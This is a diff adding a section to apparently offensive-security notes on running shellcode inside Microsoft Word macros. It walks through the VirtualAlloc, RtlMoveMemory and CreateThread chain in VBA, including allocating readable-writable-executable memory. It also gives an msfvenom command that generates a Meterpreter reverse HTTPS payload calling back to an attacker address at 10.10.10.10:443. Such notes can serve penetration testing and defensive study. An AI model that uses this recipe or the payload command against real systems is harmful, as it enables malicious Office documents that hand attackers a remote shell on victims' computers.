@@ -1000,3 +1000,76 @@ htc --forward-port 8080 10.10.10.10:4444
 ```
 4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)
 
+# Executing Shellcode in Word Memory
+To execute shellcode in memory we will take use of the three Win32 API's
+
+**VirtualAlloc**
+Used to allocate memory. [Link](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
+
+```
+LPVOID VirtualAlloc(
+  LPVOID lpAddress,
+  SIZE_T dwSize,
+  DWORD  flAllocationType,
+  DWORD  flProtect
+);
+```
+|--------|---------|
+|lpAddress| memory allocation address (set to 0, API will choose location)|
+|dwSize [int]| size of allocation|
+|flAllocationType [int]| allocation type (e.g. 0x3000 => [MEM_COMMIT and MEM_RESERVE](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), in VBA: &H3000)|
+|flProtect [int]| memory attribute (0x40 means the memory is readable, writable and executable, in VBA: &H40) |
+|return value [LongPtr]| memory pointer|
+
+
+* Integers can be translated to ``Long``
+* dwSize can be hardcoded or set dynamically using ``UBound``: ``UBound(buf)``. [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ubound-function), also see ``LBound`` [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/lbound-function)
+
+**RtlMoveMemory**
+After allocating memory we must copy our desired shellcode bytes into this memory location (executable buffer). This is done using ``RtlMoveMemory``. 
+
+```
+VOID RtlMoveMemory(
+  VOID UNALIGNED *Destination,
+  VOID UNALIGNED *Source,
+  SIZE_T         Length
+);
+```
+
+destination pointer [LongPtr]: memory pointer, points to newly allocated buffer
+source buffer [Any]:address of an element from the shellcode (passed by reference)
+length [Long]: length of shellcode to be copied (passed by value)
+return value [LongPtr]: memory pointer
+
+**CreateThread**
+After copying the shelcode into the executable buffer, we can execute it with ``CreateThread``. [Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
+
+```
+HANDLE CreateThread(
+  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
+  SIZE_T                  dwStackSize,
+  LPTHREAD_START_ROUTINE  lpStartAddress,
+  LPVOID                  lpParameter,
+  DWORD                   dwCreationFlags,
+  LPDWORD                 lpThreadId
+);
+```
+
+
+## Generate Shellcode
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f vbapplication
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
